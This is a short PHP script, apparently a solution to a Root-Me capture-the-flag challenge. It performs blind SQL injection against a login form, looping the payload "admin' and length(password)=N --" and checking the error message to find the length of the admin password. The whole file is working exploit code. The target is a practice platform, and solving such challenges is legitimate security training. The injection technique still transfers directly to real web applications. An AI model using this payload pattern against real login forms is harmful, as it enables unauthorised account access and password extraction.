<?php

function getLength() {
    $i = 0;
    $url = "http://challenge01.root-me.org/web-serveur/ch10/";
    while (true) {
        $data = array(
            'username' => "admin' and length(password)=$i --",
            'password' => 'secret'
        );
        $query = http_build_query($data);
        $context = stream_context_create(array(
            'http' => array(
                'method' => 'POST',
                'header' => 'Content-Type: application/x-www-form-urlencoded',
                'content' => $query
            )
        ));
        $response = file_get_contents($url, false, $context);
        if (!str_contains($response, "Error : no such user/password")) {
            break;
        }
        $i++;
    }
    return $i;
}
